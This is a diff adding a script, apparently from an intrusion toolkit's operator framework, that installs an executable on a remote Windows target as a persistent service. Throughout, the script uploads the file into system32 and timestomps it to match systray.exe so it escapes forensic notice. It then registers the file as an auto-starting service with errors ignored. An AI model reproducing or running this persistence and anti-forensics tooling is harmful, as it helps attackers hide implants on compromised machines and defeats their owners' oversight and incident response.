@@ -1,0 +1,117 @@
+#--------------------------------------------------------
+# File: Install.eps
+#
+# Wrapper script for Install of Services
+#
+# Modifications:
+#  11/18/2002	Created.
+#--------------------------------------------------------
+
+if ($argc != 4) {
+    echo "Usage: $argv[0] <ServiceName> <ServiceDescription> <SourceExe>";
+    return false;
+}
+
+string $ServiceName = $argv[1];
+string $ServiceDescrip = $argv[2];
+string $SourceExe   = $argv[3];
+
+# check to make sure we're 2000 or higher
+@record on;
+ifnot (`systemversion`) {
+    echo "Unable to get system version -- manually verify that";
+    echo "the target system is Windows 2000 or greater";
+    pause;
+} else {
+    int $major = GetCmdData("sysVerMajor");
+    int $spMajor = GetCmdData("sysSPMajor");
+    if ($major == 4) {
+	# NT box
+	if ($spMajor < 4) {
+	    # Service pack 3 or less
+	    echo "*** Target system is pre-NT Sp4. ***";
+	    echo "    Services is not compatible with this system";
+	    return false;
+	}
+    }
+}
+
+ifnot (prompt "Are you sure you want to install service $ServiceName from $SourceExe?") {
+    return false;
+}
+
+@record on;
+
+# get the root directory
+string $systemroot;
+
+if (`regquery -hive L -subkey "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion" -value SystemRoot`) {
+    $systemroot = GetCmdData("enum_keyvalue_data");
+}
+
+ifnot (defined($systemroot[0])) {
+    echo "* Unable to determine system root";
+    return false;
+}
+
+# get resource directory
+ifnot (`getdirectory -scripts`) {
+	echo "* Unable to get scripts directory";
+	return false;
+}
+
+string $ScriptsDir = GetCmdData("dir");
+ifnot (defined($ScriptsDir[0])) {
+	echo "* Unable to retrieve scripts directory";
+	return false;
+}
+
+string $resPath = "$ScriptsDir\\..\\..\\Services";
+
+@record off;
+
+# make sure it's not already installed
+if (`regquery -hive L -subkey SYSTEM\\CurrentControlSet\\Services\\$ServiceName`) {
+    echo "$ServiceName is already installed (key exists)";
+    return false;
+}
+
+if (`dir $ServiceName.exe -path "$systemroot\\system32"`) {
+    echo "$ServiceName is already installed (file exists)";
+    return false;
+}
+
+#---------------------------
+# Service not installed
+#---------------------------
+
+# put the service exe
+echo "Uploading $SourceExe";
+echo "to $systemroot\\system32\\$ServiceName.exe";
+if (`put "$resPath\\$SourceExe" -name "$systemroot\\system32\\$ServiceName.exe" -permanent`) {
+    echo "    SUCCESS";
+} else {
+    echo "    FAILED";
+    return false;
+}
+
+# match file times for driver
+echo "Matching file time for EXE";
+if (`matchtimes "$systemroot\\system32\\systray.exe" "$systemroot\\system32\\$ServiceName.exe"`) {
+    echo "    SUCCESS";
+} else {
+    echo "    FAILED (but continuing anyway)";
+}
+
+
+echo "Creating service";
+@echo on;
+if (`run -command ".\\sc create $serviceName binPath= $systemroot\\system32\\$ServiceName.exe DisplayName= \\"$ServiceDescrip\\" type= own error= ignore start= auto" -redirect create`){
+    echo "    run sc create SUCCESS";
+} else {
+    echo "    run sc create FAILED";
+}
+@echo off;
+
+# we're done...
+return true;
